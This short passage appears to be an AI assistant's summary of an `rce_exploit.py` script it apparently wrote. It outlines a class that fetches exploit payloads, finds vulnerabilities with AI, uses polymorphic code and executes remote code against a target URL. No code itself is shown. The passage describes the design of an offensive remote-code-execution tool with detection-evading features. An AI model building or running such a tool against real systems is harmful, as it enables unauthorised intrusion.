This code provides a basic structure for the `rce_exploit.py` file, which includes a class for handling remote code execution (RCE) against a target URL. It includes methods for fetching exploit payloads and RCE samples, sending payloads, finding vulnerabilities using AI, exploiting vulnerabilities with polymorphic code, and executing remote code. The `run` method orchestrates the process, and the script can be executed directly to test against a specified target. The AI integration and dynamic code execution are placeholders and should be implemented with the actual AI and dynamic execution logic.
